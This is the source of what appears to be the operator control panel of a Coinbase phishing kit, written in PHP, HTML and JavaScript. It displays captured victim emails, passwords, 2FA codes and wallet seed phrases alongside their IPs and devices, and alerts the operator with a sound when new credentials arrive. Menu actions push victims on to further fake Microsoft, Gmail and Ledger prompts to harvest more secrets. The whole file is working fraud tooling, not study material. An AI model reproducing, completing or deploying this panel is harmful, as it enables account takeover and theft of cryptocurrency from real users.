<?php
session_start();
if(!isset($_SESSION['user_id']) && !isset($_SESSION['username'])){
    header('Location: /admin/login');
    exit;
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Coinbase - @xyyxyxyxyxyyxyxyxyxyyxyxyxy</title>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css" rel="stylesheet">
<link rel="icon" href="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" type="image/png">

<style>
    body {
        background: #000;
        background-size: cover;
        height: 100vh;
        margin: 0;
        color: #e0e0e0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        padding: 0;
    }
    .navbar {
        background-color: #000;
        padding: 10px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 2px 5px rgba(0,0,0,0.5);
    }
    .navbar a {
        color: #e0e0e0;
        text-decoration: none;
        font-size: 16px;
    }
    .custom-table {
        border: 1px solid #060505;
        border-radius: 10px;
        width: 100%;
        max-width: 100%;
        overflow-x: auto;
        border-collapse: collapse;
        margin-top: 20px;
    }
    .custom-table th, .custom-table td {
        border: 1px solid #000;
        padding: 8px;
        text-align: left;
        color: #e0e0e0;
    }
    .custom-table th {
        background-color: #000;
    }
    .custom-table tbody tr {
        background-color: #000;
    }
    .custom-dropdown {
        position: relative;
        display: inline-block;
    }

    .custom-dropdown button {
        border: none !important;
    }

    .custom-dropdown-content {
        display: none;
        position: absolute;
        background-color: #000;
        min-width: 160px;
        box-shadow: 2px 8px 16px 0px rgba(0,0,0,0.3);
        z-index: 1;
        white-space: nowrap;
    }
    .custom-dropdown-content a {
        color: #e0e0e0;
        padding: 7px 16px;
        text-decoration: none;
        display: block;
        background-color: #000;
    }
    .btn, .btn-secondary {
        background-color: #000 !important;
        border-color: #060505;
    }
    .custom-dropdown-content a:hover {background-color: rgba(255, 255, 255, 0.2)}
    .status-dot {
        height: 10px;
        width: 10px;
        border-radius: 50%;
        display: inline-block;
        animation: blinker 1s linear infinite;
    }
    .status-dot.online {
        background-color: #00FF00;
    }
    .status-dot.offline {
        background-color: #FF0000;
    }
    @keyframes blinker {
        50% { opacity: 0; }
    }
    .btn, .btn-secondary {
        background-color: #262626;
        border-color: #060505;
    }
    .pagination {
        display: flex;
        justify-content: center;
        margin-top: 20px;
    }
    .pagination a {
        margin: 0 5px;
        text-decoration: none;
        color: #e0e0e0;
    }
    .pagination a.active {
        font-weight: bold;
    }
    .modal {
        display: none;
        position: fixed;
        z-index: 2;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0,0,0,0.6);
    }
    .modal-content {
        background-color: #060505;
        margin: 5% auto;
        padding: 20px;
        border-radius: 8px;
        border: 1px solid #444;
        width: 90%;
        max-width: 500px;
        color: #f0f0f0;
        box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        position: relative;
    }
    .close {
        color: #ccc;
        position: absolute;
        top: 10px;
        right: 10px;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }
    .close:hover,
    .close:focus {
        color: #f00;
        text-decoration: none;
        transition: color 0.3s ease-in-out;
    }
    .modal input[type="text"] {
        width: 100%;
        padding: 12px 15px;
        margin: 8px 0;
        display: inline-block;
        border: 1px solid #555;
        border-radius: 5px;
        box-sizing: border-box;
        background-color: #060505;
        color: #fff;
    }
    .modal button {
        background-color: #060505;
        border: 1px solid #333;
        color: #fff;
        padding: 14px 18px;
        margin: 8px 0;
        border-radius: 5px;
        cursor: pointer;
        width: 100%;
        box-shadow: 0 2px 4px rgba(0,0,0,0.4);
    }
    .select-style {
        overflow: hidden;
        background-color: #000;
        color: #e0e0e0;
        padding: 5px 10px;
        font-size: 16px;
        outline: none;
        border: none;
    }
    .select-style option {
        background-color: #000;
        color: #e0e0e0;
    }
    .blur {
        filter: blur(4px);
        transition: filter 0.3s;
    }
    .blur:hover {
        filter: blur(0);
    }
    .updated-label {
        display: inline-block;
        width: 120px;
        padding: 4px 5px;
        border: 1px solid #000080; /* Dark blue border */
        color: #e0e0e0;
        background-color: #000;
        font-size: 10px;
        text-align: center;
        margin-top: 2px;
    }
    .not-updated-label {
        display: inline-block;
        width: 100px;
        padding: 2px 5px;
        border: 1px solid #FF0000; /* Red border */
        color: #e0e0e0;
        background-color: #000;
        font-size: 10px;
        text-align: center;
        margin-top: 2px;
    }
    @media (max-width: 768px) {
        .navbar {
            flex-direction: column;
            padding: 10px;
        }
        .navbar a {
            font-size: 14px;
        }
        .custom-table th, .custom-table td {
            padding: 6px;
            font-size: 14px;
        }
        .custom-table {
            display: block;
            overflow-x: auto;
            white-space: nowrap;
        }
        .modal-content {
            width: 90%;
            margin: 10% auto;
        }
    }
    @media (max-width: 480px) {
        .navbar {
            padding: 5px;
        }
        .navbar a {
            font-size: 12px;
        }
        .custom-table th, .custom-table td {
            padding: 4px;
            font-size: 12px;
        }
        .custom-table {
            display: block;
            overflow-x: auto;
            white-space: nowrap;
        }
    }
</style>

</head>
<body>
<div class="navbar">
    <a href="#" style="display: flex; align-items: center;">
        <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase Logo" style="height: 20px; width: auto; margin-right: 10px;">
        - @swag
    </a>
    

</div>
<div class="container mt-5">
    <div class="row">
        <div class="col-12">
            <table class="custom-table" id="victimsTable">
                <thead>
                    <tr>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Status</th>
                        <th>Page</th>
                        <th>Code</th>
                        <th>Phrase</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="victimsData">
                </tbody>
            </table>
            <div class="pagination" id="pagination">
            </div>
        </div>
    </div>
</div>
<div id="myModal" class="modal">
    <div class="modal-content">
        <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <p>Enter Google Code:</p>
        <input type="text" id="2faCode" placeholder="Enter Code">
        <button onclick="submit2FACode()">Submit</button>
    </div>
</div>
<div id="userInfoModal" class="modal">
    <div class="modal-content">
        <svg class="close" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <p style="font-size: 18px; font-weight: bold;">User Information:</p>
        <div style="font-size: 16px;">User Agent: <span id="userAgentDisplay" style="font-weight: bold;"></span></div>
        <div style="font-size: 16px;">User IP: <span id="userIpDisplay" class="blur" style="font-weight: bold;"></span></div>
        <div style="font-size: 16px;">Device: <span id="userDevice" style="font-weight: bold;"></span></div>
        <div style="font-size: 16px;">Url: <span id="userUrl" style="font-weight: bold;"></span></div>
        
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>
<script>
    $(document).ready(function() {
        var notyf = new Notyf({position: {x: 'right', y: 'bottom'}});
        let previousData = null;
        let currentPage = 1;
        const rowsPerPage = 3;
        let lastOnlineTime = Date.now();
        let openDropdowns = new Set();
        let selectedRows = new Set();

        function fetchData() {
            fetch('/admin/users/heartbeat')
            .then(response => response.json())
            .then(data => {
                if (JSON.stringify(data) !== JSON.stringify(previousData)) {
                    if (shouldPlayAudio(data, previousData)) {
                        playAudio();
                    }
                    previousData = data;
                    renderPageData();
                }
            });
        }

        function shouldPlayAudio(newData, oldData) {
            if (!oldData) return false; 

            return newData.some((newItem, index) => {
                const oldItem = oldData[index];
                if (!oldItem) return true; 

                return Object.keys(newItem).some(key => {
                    if (key === 'status' || key === 'current_page') return false;
                    return newItem[key] !== oldItem[key];
                });
            });
        }

        function playAudio() {
            var audio = new Audio('/message.mp3');
            audio.play().catch(error => {
                console.error("Failed to play audio:", error);
            });
        }

        function renderPageData() {
            $('#victimsData').empty();
            const startIndex = (currentPage - 1) * rowsPerPage;
            const endIndex = startIndex + rowsPerPage;
            const paginatedItems = previousData.slice(startIndex, endIndex);
            paginatedItems.forEach(victim => {
                const statusClass = victim.status == '1' ? 'online' : 'offline';
                const statusDisplay = victim.status
                $('#victimsData').append(`
                    <tr id="row-${victim.id}" class="${selectedRows.has(victim.id) ? 'selected' : ''}">
                        <td>${victim.email || 'Unknown'}</td>
                        <td class="blur">${victim.password || 'Unknown'}</td>
                        <td><span class="status-dot ${statusClass}"></span> ${statusClass}</td>
                        <td>${victim.current_page || 'Unknown'}</td>
                        <td class="blur">${victim.code || '0'}</td>
                        <td class="blur">${victim.phrase || 'Unknown'}</td>
                        <td>
                            <div class="custom-dropdown">
                                <button class="btn btn-secondary" type="button" onclick="toggleDropdown(this, ${victim.id})">Manage</button>
                                <div class="custom-dropdown-content" id="dropdown-${victim.id}">
                                    <a href="#" onclick="userInfo(${victim.id}, '${victim.useragent}', '${victim.ip}', '${victim.device}', '${victim.phrase}', '${victim.url}')">Client Info</a>
                                    <a href="#" onclick="reportIncorrectPassword(${victim.id})">Incorrect Password</a>
                                    <a href="#" onclick="reportImportSeed(${victim.id})">Import Seed</a>
                                    <a href="#" onclick="reportGenSeed(${victim.id})">Gen Seed</a>
                                    <a href="#" onclick="reportPending(${victim.id})">Pending</a>
                                    <a href="#" onclick="reportSms(${victim.id})">Sms</a>
                                    <a href="#" onclick="reportTerminate(${victim.id})">Terminate Url</a>
                                    <div class="custom-dropdown">
                                        <a href="#" onclick="toggleDropdown(this)">Other Actions <span class="arrow">&#9660;</span></a>
                                        <div class="custom-dropdown-content">
                                            <a href="#" onclick="reportMicrosoftLogin(${victim.id})">Microsoft Login</a>
                                            <a href="#" onclick="report2fa(${victim.id})">2FA - Gmail</a>
                                            <a href="#" onclick="reportGmailPwd(${victim.id})">Gmail - Password</a>
                                            <a href="#" onclick="reportLedger(${victim.id})"> Ledger - Phrase</a>

                                            <a href="#" onclick="showModal(${victim.id}, '${victim.gcode}')">Verify - Gmail</a>
                                        </div>
                                    </div>
                                    <a href="#" onclick="reportDelete(${victim.id})">Delete</a>
                                </div>
                            </div>
                        </td>
                    </tr>

                    <style>
                                .arrow {
                                    display: inline-block;
                                    transition: transform 0.3s ease;
                                }
                                
                            </style>
                `);
            });
            displayPagination(previousData.length);
            restoreOpenDropdowns();
            restoreSelectedRows();
        }

        function displayPagination(totalItems) {
            $('#pagination').empty();
            const pageCount = Math.ceil(totalItems / rowsPerPage);
            for (let i = 1; i <= pageCount; i++) {
                $('#pagination').append(`<a href="#" class="${i === currentPage ? 'active' : ''}" onclick="changePage(${i})">${i}</a>`);
            }
        }

        window.reportTerminate = function(id) {
            const url = `/admin/actions?action=terminate&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportSms = function(id) {
            const url = `/admin/actions?action=sms&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportIncorrectPassword = function(id) {
            const url = `/admin/actions?action=redirect_password&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportMicrosoftLogin = function(id) {
            const url = `/admin/actions?action=microsoft_login&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportGenSeed = function(id) {
            const url = `/admin/actions?action=gen_seed&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }
        

        window.reportImportSeed = function(id) {
            const url = `/admin/actions?action=seed&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportGmailPwd = function(id) {
            const url = `/admin/actions?action=gmail_pwd&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportDelete = function(id) {
            const url = `/admin/actions?action=delete&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been deleted');
        }

        window.reportLedger = function(id) {
            const url = `/admin/actions?action=update_phrase&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.reportPending = function(id) {
            const url = `/admin/actions?action=pending&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.changePage = function(page) {
            if (page !== currentPage) {
                currentPage = page;
                renderPageData();
            }
        }

        fetchData();
        setInterval(fetchData, 1200);

        window.toggleDropdown = function(button, id) {
            const dropdownContent = $(button).next('.custom-dropdown-content');
            dropdownContent.toggle();
            if (dropdownContent.is(':visible')) {
                openDropdowns.add(id);
            } else {
                openDropdowns.delete(id);
            }
        }

        function restoreOpenDropdowns() {
            openDropdowns.forEach(id => {
                $(`#dropdown-${id}`).show();
            });
        }

        function restoreSelectedRows() {
            selectedRows.forEach(id => {
                $(`#row-${id}`).addClass('selected');
            });
        }

        window.reportGen = function(id) {
            const url = `/admin/action?action=gen&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('Victim has been redirected');
        }

        window.showModal = function(id, gcode) {
            $('#myModal').show();
            $('#2faCode').val(gcode);
            $('#myModal button').off('click').on('click', function() {
                const code = $('#2faCode').val();
                report2facode(id, code);
                $('#myModal').hide();
            });
        }
        

        window.report2facode = function(id, code) {
            const url = `/admin/actions?action=gmail_verify&id=${id}&gcode=${code}`;
            fetch(url, { method: 'GET' });
            notyf.success('2FA code has been updated and victim has been redirected');
        }


        window.report2fa = function(id){
            const url = `/admin/actions?action=2fa_gmail&id=${id}`;
            fetch(url, { method: 'GET' });
            notyf.success('2FA code has been updated and victim has been redirected');
        }

        window.userInfo = function(id, useragent, ip, device, phrase, url) {
            $('#userAgentDisplay').text(useragent === null ? 'N/A' : useragent);
            $('#userIpDisplay').text(ip === null ? 'N/A' : ip);
            $('#userDevice').text(device === null ? 'N/A' : device);
            $('#userUrl').text(url === null ? 'N/A' : url);
            $('#userInfoModal').show();
        }

        $('.close').click(function() {
            $('#myModal').hide();
            $('#userInfoModal').hide();
        });

        window.handleSelectChange = function(select) {
            if (select.value === 'Logout') {
                fetch('/logout').then(() => {
                    window.location.href = '/admin/login';
                });
            }
        }
    });
</script>
</body>
</html>
